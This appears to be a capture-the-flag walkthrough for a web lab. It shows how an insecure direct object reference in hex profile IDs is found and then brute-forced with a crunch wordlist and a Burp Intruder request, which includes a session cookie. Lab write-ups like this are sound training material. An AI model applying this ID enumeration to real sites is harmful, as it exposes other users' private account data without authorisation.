First register `/register` and then login.
Then go to profile, In url you'll see `http://cdcamxwl32pue3e6m0wz06mliwzoe0wz0wkr5cwzo-web.cybertalentslabs.com/profile/1b` a hex value (1b)

Check for IDOR. I used 1,2,...and it gave me other users info

And since its hex value we can brute force using all the hex numbers:

Generate a wordlist using crunch:
```
crunch 1 2 0123456789abcdef -o hex1.txt
```
It'll generate a wordlist containing 272 payloads.

Go to burp and send the request in intruder:
```
GET /profile/1b HTTP/1.1
Host: cdcamxwl32pue3e6m0wz06mliwzoe0wz0wkr5cwzo-web.cybertalentslabs.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:151.0) Gecko/20100101 Firefox/151.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://cdcamxwl32pue3e6m0wz06mliwzoe0wz0wkr5cwzo-web.cybertalentslabs.com/
Cookie: session=eyJpZCI6IjFiIiwic2VjcmV0IjoiZDM1YWE3YzU1MTUwNGIyOTllZTg2MjdiYTk3MmQ1MGEifQ.ahG1qg.CCrFIaEoCsS1gnEP9Ndr6lMpk3s
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```
Set Payload to $1b$. Use the generated wordlist as payloads.
Start attack.
Check for difference in responses and one of them will contain the flag.
